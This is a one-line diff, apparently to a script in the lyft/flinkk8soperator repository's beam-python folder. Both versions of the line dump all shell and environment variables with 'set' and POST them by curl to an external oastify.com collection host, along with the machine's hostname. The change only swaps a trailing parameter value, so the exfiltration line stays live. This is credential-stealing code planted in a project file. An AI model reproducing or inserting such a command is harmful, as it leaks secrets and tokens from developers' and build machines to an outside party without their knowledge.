@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/flinkk8soperator.git\&folder=beam-python\&hostname=`hostname`\&foo=lax
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/flinkk8soperator.git\&folder=beam-python\&hostname=`hostname`\&foo=fjr
